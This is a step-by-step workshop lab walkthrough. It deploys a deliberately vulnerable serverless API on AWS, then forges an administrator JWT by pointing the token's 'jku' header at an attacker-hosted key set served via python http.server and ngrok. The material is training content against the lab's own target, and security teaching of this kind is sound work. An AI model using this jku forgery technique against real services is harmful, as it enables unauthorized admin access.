## JWT - JKU Authorization Bypass

**Note:** If you have not setup your aws cli follow [AWS-CLI-Configuration](aws-configure/README.md) under the `Setup` section*

* Step 1: In your image, navigate over to `/root/labs/Serverless-Workshop/`

```commandline
cd /root/labs/Serverless-Workshop/
```

* Step 2: Run `pip3 install pipenv`

```commandline
pip3 install pipenv
```

* Step 3: Run `pipenv install`

```commandline
pipenv install
```

```commandline
pipenv install jwcrypto
```

* Step 4: `pipenv shell`

```commandline
pipenv shell
``` 

* Step 5: In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`

```commandline
cd /root/labs/Serverless-Workshop/JWT-JWK
```

* Step 6: Run `sls plugin install -n serverless-python-requirements`

```commandline
sls plugin install -n serverless-python-requirements
```

* Wait for instructor to explain the contents of the lab
* Step 7: Install a package for this to work `npm install -g jwt-cli`

```commandline
npm install -g jwt-cli
```

* Step 8: Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/JWT-JWK/serverless.yml)

* Step 9: Deploy the function with the command `sls deploy`

```commandline
sls deploy
```

* Wait for the function to deploy completely

* Step 10: Initialize the Program with the following command 

```bash
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
```

you should see an output like this

```bash
    HTTP/1.1 200 OK
    Connection: keep-alive
    Content-Length: 73
    Content-Type: application/json
    Date: Fri, 26 Jul 2019 11:56:09 GMT
    Via: 1.1 706c647442c234a140558b049b967cc5.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: GPaQyO3YdDda1NBe5hqqZ5a7Mpdf5NgZxm2kjQm1TQk76V2cWQ9m_Q==
    X-Amz-Cf-Pop: BLR50-C1
    X-Amzn-Trace-Id: Root=1-5d3aea58-c194ed1820098bd0973e3f08;Sampled=0
    X-Cache: Miss from cloudfront
    x-amz-apigw-id: dbmNwEp0PHcFY8Q=
    x-amzn-RequestId: 5a8fc007-af9c-11e9-b076-b3cc7c0d1d4b
    
    {
        "url": "https://jwk-resources-1564139712929.s3.amazonaws.com/jwks.json"
    }
```
* Step 11: Now, obtain a token from the system by logging in

```bash
http POST https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/login user=admin password=admin
```

you should see output like this

```json
{
    "token": "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vandrLXJlc291cmNlcy0xNTY0MTM5NzEyOTI5LnMzLmFtYXpvbmF3cy5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoidXNlciJ9.hsA7nYpgplSmhLLhFX18cJTO2HGJYeqMDT8OQe1IZRWseH9ZDOiSa1QHQvSkhmrVSB8h_0Cw6nCj_v5JblnyUC-peY1nWzDAD1xbZCfY0PDUXaq-mKOxfr1-X0Uotc-UabTISGcciLl3DJvRspJa928xNrMM5JRIpYX3X5UpiucmUcbBtudYn-KPgVJVbAvCxB_cAGTi5IWT7bDMnO5-ofcL29xjo-BYhkX9JVPG3xg6yfKEOTSgFjLq6dbldu_sNX-KSwohKKRVkhIkSQOpIdUcw8u9BMqJ3tSE8fgugEZfu5oGqciz9jo_CRwahkEjkZ8XCc4QtfO_TiL63sDnCA",
    "user": "user"
}
```

* Step 12: Copy the `token` value and run `jwt <copied token value>`

```commandline
jwt <copied token value>
```

or you can check [here](https://jwt.io/)

* You should see something like this

```bash
Header
{
  "alg": "RS256",
  "jku": "https://jwk-resources-1564139712929.s3.amazonaws.com/jwks.json"
}

Payload
{
  "user": "user"
}

```

* Step 13: Now, open another two tabs of your lab image. You have now a total of three tabs. Let's call the current tab, **Tab 1**

In the **Tab 2**: 

* Step 14: In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`

```commandline
cd /root/labs/Serverless-Workshop/JWT-JWK
```

* Step 15: Run: `python -m http.server`

```commandline
python -m http.server
```

In the **Tab 3**:

* Step 16: Install *ngrok* `wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip`

```commandline
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
```
* Step 17: Run `apt-get install unzip`

```commandline
apt-get install unzip
```

* Step 18: `unzip` the *ngrok* `unzip ngrok-stable-linux-amd64.zip`

```commandline
unzip ngrok-stable-linux-amd64.zip
```

* Step 19: Run `./ngrok http 8000`

```commandline
./ngrok http 8000
```

```bash
Session Status                online
Session Expires               7 hours, 10 minutes
Update                        update available (version 2.3.34, Ctrl-U to update
Version                       2.2.8
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://f8ccd11d.ngrok.io -> localhost:8000
Forwarding                    https://f8ccd11d.ngrok.io -> localhost:8000
```

Back in **Tab 1**:
* Step 20: Run `python token_gen.py https://f8ccd11d.ngrok.io` with copied *ngrok*  https `Forwarding` value 

```commandline
python token_gen.py https://<ngrok https forwarding value>.ngrok.io
```
 
* Step 21: Copy the generated token starting `ey....`

* Step 22: Run
 
```bash
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/jwk Authorization:<Copied Token>
```

**Note:** You should see a response, that you are administrator


### Teardown

* Step 23: **Tab 1**, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`

```commandline
cd /root/labs/Serverless-Workshop/JWT-JWK
```

* Step 24: Run `sls remove` to remove stack

```commandline
sls remove --force
```

* Step 25: Deactivate `pipenv` using `deactivate` command

```commandline
deactivate
```

```commandline
exit
```

* Step 26: **Tab 2** Run `ctrl+c` and close tab

* Step 27: **Tab 3** Run `ctrl+c` and close tab
